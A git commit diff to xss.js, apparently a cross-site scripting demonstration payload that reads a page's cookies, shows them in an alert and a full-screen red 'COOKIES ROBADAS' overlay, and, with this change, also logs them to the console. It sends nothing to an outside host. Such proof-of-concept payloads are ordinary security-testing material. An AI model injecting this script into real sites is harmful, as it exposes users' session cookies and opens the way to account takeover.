3f122bbaabc78a6dbf1198f6b5217da9b648f5a0
Rodrigo Florian <125144252+RODRIGOF-FG@users.noreply.github.com>
2026-06-19 14:09:00 -0500

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,8 +1,9 @@
 (function(){
 var c=document.cookie;
 alert('COOKIES: '+c);
+console.log('COOKIES ROBADAS:',c);
 var div=document.createElement('div');
-div.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;font-size:20px;padding:20px;z-index:9999';
-div.innerHTML='<h1>COOKIES ROBADAS</h1><p>'+c+'</p>';
+div.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;font-size:18px;padding:20px;z-index:9999;overflow:auto';
+div.innerHTML='<h1>🔓 COOKIES ROBADAS</h1><p style="word-break:break-all;background:black;padding:10px;border-radius:5px">'+c+'</p>';
 document.body.appendChild(div);
 })();
